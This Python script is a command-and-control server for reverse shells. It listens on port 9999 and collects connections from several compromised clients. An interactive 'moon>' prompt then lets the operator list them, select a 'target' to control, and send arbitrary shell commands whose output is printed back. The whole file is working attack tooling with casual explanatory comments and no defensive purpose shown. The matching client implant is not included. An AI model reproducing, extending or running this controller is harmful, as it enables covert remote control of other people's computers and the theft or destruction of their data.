from concurrent.futures import thread
import socket
import sys
import threading
from queue import Queue

Number_Of_Threads = 2
Thread_Name = [1 ,2] #one for handling clients(connection) and 2nd one for choosing clients
queue = Queue()
all_Connections = []
all_IP_PORT_Address = []

#this function create socket for connecting two pc
def socket_create():
    try:
        global host 
        global port 
        global soc
        host = ''
        port = 9999
        soc = socket.socket()
    except socket.error as err:
        print("Socket creation failed due to : "+str(err))

#this function bind socket to port and wait for connection
def bind_socket():
    try:
        global host
        global port
        global soc
       # print("Binding to the port "+ str(port))
        soc.bind((host,port))
        soc.listen(10)
    except socket.error as err:
        print("SOcket binding error: "+ str(err) + "\nRetrying...")
        bind_socket()

#this function accept connection from multiple clients and save it to the list
def accept_all_connection():
    for c in all_Connections:
        c.close()
    del all_Connections[:]
    del all_IP_PORT_Address[:]
    while True:
        try:
            conn, address = soc.accept()
            #In blocking socket mode, a system call event halts the execution until an appropriate reply has been received. 
            # In non-blocking sockets, it continues to execute even if the system call has been invoked and deals with its reply appropriately later
            conn.setblocking(1)
            all_Connections.append(conn)
            all_IP_PORT_Address.append(address)
            print("\nConnection has been establised on || "+address[0])
        except:
            print("Error accepting connection")

#this function makes the cmd prompt interactive for sending command
def start_moon():
    while True:
        cmd = input('\nmoon> ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
             #whenever we  get the connection back that we chose we just want to test to make sure it's not equal to none
             #because maybe from the time you started this till the time you listed everything they get disconnected
             #or maybe it's some old connection that's still on your list
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Ooops...!! Not my command")

#this function will display the list of all available(current) connection
def list_connections():
    results = ''
    for i, conn in enumerate(all_Connections):
        try:
            conn.send(str.encode(' ')) #sending blank msg to check if it's a valid connection or not
            conn.recv(2048) #if we receive something that means it's a valid conn otherwise delete it from the list
        except:
            del all_Connections[i]
            del all_IP_PORT_Address[i]
            continue                
        results += str(i) + "    " + str(all_IP_PORT_Address[i][0]) + "    " + str(all_IP_PORT_Address[i][1]) + "\n" #0  IP  PORT
    print("----------Available Clients----------\n"+results)

#this function will select a target(client you want to control)
def get_target(command):
    try:
        target = command.replace("select ","")
        target = int(target)
        conn = all_Connections[target]
        print("You are now connected to "+str(all_IP_PORT_Address[target][0]))
        print(str(all_IP_PORT_Address[target][0])+"> ", end="")
        return conn
    except:
        print("Ooop..!! Wrong selection")
        return None

#this function will send the command to the selected target(client you wanna control)
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response,end=" ")
            if cmd == "moon": #when we type this it will break the look and go back to start_moon() method
                break 
        except:
            print("Connection gone..!")
            break

#this function will create thread
def create_threads():
    for i in range(Number_Of_Threads):
        t = threading.Thread(target=work_of_thread)
        t.daemon = True #this will make our thread doe when our main program die
        t.start()

#this function will do the job in queue(one handles connection, other one sends commands)
def work_of_thread():
    while True:
        x =queue.get()
        if x ==1:
            socket_create()
            bind_socket()
            accept_all_connection()
        if x == 2:
            start_moon()
        queue.task_done()

#this function will add thread to queue
def create_queue():
    for x in Thread_Name:
        queue.put(x)
    queue.join()


create_threads()
create_queue()
